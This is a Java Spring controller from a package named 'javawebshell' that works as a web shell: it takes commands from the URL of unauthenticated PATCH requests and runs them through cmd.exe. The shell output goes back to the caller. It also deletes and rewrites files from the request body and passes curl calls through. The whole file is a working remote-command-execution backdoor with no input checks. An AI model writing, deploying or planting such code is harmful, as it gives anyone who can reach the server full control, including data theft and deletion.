package tw.ouyang.javawebshell;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.nio.file.Paths;

import javax.servlet.http.HttpServletRequest;

import org.springframework.beans.factory.annotation.Value;
import org.springframework.context.annotation.Profile;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RestController;

@Profile("windows")
@RestController
public class WindowsShellController {

    @Value("${current.directory}")
    private String currentDirectory;

    @RequestMapping(value = "command/**", method = RequestMethod.PATCH)
    public String command(HttpServletRequest request, @RequestBody(required = false) String requestBody) throws Exception {
        String url = request.getRequestURL().toString();
        String[] inputCommands = url.split("/command/")[1].split("%20");

        if ("cd".equals(inputCommands[0]) && inputCommands.length == 2) {
            if (Paths.get(inputCommands[1]).isAbsolute()) {
                currentDirectory = inputCommands[1];
            } else {
                currentDirectory = Paths.get(currentDirectory, inputCommands[1]).toRealPath().toString();
            }
            return String.format("url: %s\ncurrentDirectory: %s", url, currentDirectory);

        } else if ("vim".equals(inputCommands[0]) && inputCommands.length == 2) {
            Process process = Runtime.getRuntime().exec("cmd.exe /c del %s " + inputCommands[1], null, new File(currentDirectory));
            process.waitFor();
            for (String requestBodyString : requestBody.split("\n")) {
                if (requestBodyString.isBlank()) {
                    process = Runtime.getRuntime().exec(String.format("cmd.exe /c echo.>> %s", inputCommands[1]), null, new File(currentDirectory));
                } else {
                    process = Runtime.getRuntime().exec(String.format("cmd.exe /c echo %s>> %s", requestBodyString.trim(), inputCommands[1]), null, new File(currentDirectory));
                }
                process.waitFor();
            }
            process = Runtime.getRuntime().exec("cmd.exe /c type %s " + inputCommands[1], null, new File(currentDirectory));
            return getProcessOutput(process, new StringBuilder());

        } else if ("curl".equals(inputCommands[0])) {
            StringBuilder commandBuilder = new StringBuilder("cmd.exe /c");
            for (String inputCommand : inputCommands) {
                commandBuilder.append(" " + inputCommand);
            }
            if (!request.getParameterMap().isEmpty()) {
                commandBuilder.append("?");
                request.getParameterMap().forEach((key, value) -> {
                    commandBuilder.append(String.format("%s=%s&", key, value[0]));
                });
            }
            String command = commandBuilder.toString();
            return executeCommandAndGetOutput(url, command);

        } else {
            StringBuilder commandBuilder = new StringBuilder("cmd.exe /c");
            for (String inputCommand : inputCommands) {
                commandBuilder.append(" " + inputCommand.replace("/", "\\"));
            }
            String command = commandBuilder.toString();
            return executeCommandAndGetOutput(url, command);
        }
    }

    private String executeCommandAndGetOutput(String url, String command) throws Exception {
        StringBuilder responseBuilder = new StringBuilder();
        responseBuilder.append("url: " + url + "\n");
        responseBuilder.append("command: " + command + "\n\n");
        Process process = Runtime.getRuntime().exec(command, null, new File(currentDirectory));
        return getProcessOutput(process, responseBuilder);
    }

    private String getProcessOutput(Process process, StringBuilder responseBuilder) throws InterruptedException {
        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
        reader.lines().forEach(line -> {
            responseBuilder.append(line + "\n");
        });
        process.waitFor();
        return responseBuilder.toString();
    }

}
